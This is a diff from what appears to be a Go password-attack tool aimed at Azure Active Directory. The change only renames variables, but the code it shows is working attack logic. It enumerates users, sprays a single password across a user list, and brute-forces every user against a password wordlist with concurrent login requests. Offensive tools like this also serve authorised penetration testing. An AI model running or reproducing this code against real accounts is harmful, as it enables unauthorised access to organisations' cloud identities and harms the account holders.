@@ -111,55 +111,55 @@ func requestAzureActiveDirectory(domain string, user string, password string) {
 	defer wg.Done()
 }
 
-func enumUsers(users_file string, password string) {
+func enumUsers(usersFile string, password string) {
 
-	users, err := os.Open(users_file)
+	users, err := os.Open(usersFile)
 	if err != nil {
 		log.Fatal(err)
 	}
 	defer users.Close()
-	scanner_users := bufio.NewScanner(users)
-	for scanner_users.Scan() {
+	scannerUsers := bufio.NewScanner(users)
+	for scannerUsers.Scan() {
 		wg.Add(1)
-		user := scanner_users.Text()
+		user := scannerUsers.Text()
 		domain := strings.Split(user, "@")[1]
 		go requestAzureActiveDirectory(domain, user, password)
 	}
-	if err := scanner_users.Err(); err != nil {
+	if err := scannerUsers.Err(); err != nil {
 		log.Fatal(err)
 	}
 }
 
-func passwordAttack(passwords_file string, user string, domain string) {
+func passwordAttack(passwordsFile string, user string, domain string) {
 
-	passwords, err := os.Open(passwords_file)
+	passwords, err := os.Open(passwordsFile)
 	if err != nil {
 		log.Fatal(err)
 	}
 	defer passwords.Close()
-	scanner_passwords := bufio.NewScanner(passwords)
-	for scanner_passwords.Scan() {
+	scannerPasswords := bufio.NewScanner(passwords)
+	for scannerPasswords.Scan() {
 		wg.Add(1)
-		go requestAzureActiveDirectory(domain, user, scanner_passwords.Text())
+		go requestAzureActiveDirectory(domain, user, scannerPasswords.Text())
 	}
-	if err := scanner_passwords.Err(); err != nil {
+	if err := scannerPasswords.Err(); err != nil {
 		log.Fatal(err)
 	}
 }
 
-func bruteForcing(users_file string, passwords_file string) {
-	users, err := os.Open(users_file)
+func bruteForcing(usersFile string, passwordsFile string) {
+	users, err := os.Open(usersFile)
 	if err != nil {
 		log.Fatal(err)
 	}
 	defer users.Close()
-	scanner_users := bufio.NewScanner(users)
-	for scanner_users.Scan() {
-		user := scanner_users.Text()
+	scannerUsers := bufio.NewScanner(users)
+	for scannerUsers.Scan() {
+		user := scannerUsers.Text()
 		domain := strings.Split(user, "@")[1]
-		passwordAttack(passwords_file, user, domain)
+		passwordAttack(passwordsFile, user, domain)
 	}
-	if err := scanner_users.Err(); err != nil {
+	if err := scannerUsers.Err(); err != nil {
 		log.Fatal(err)
 	}
 }
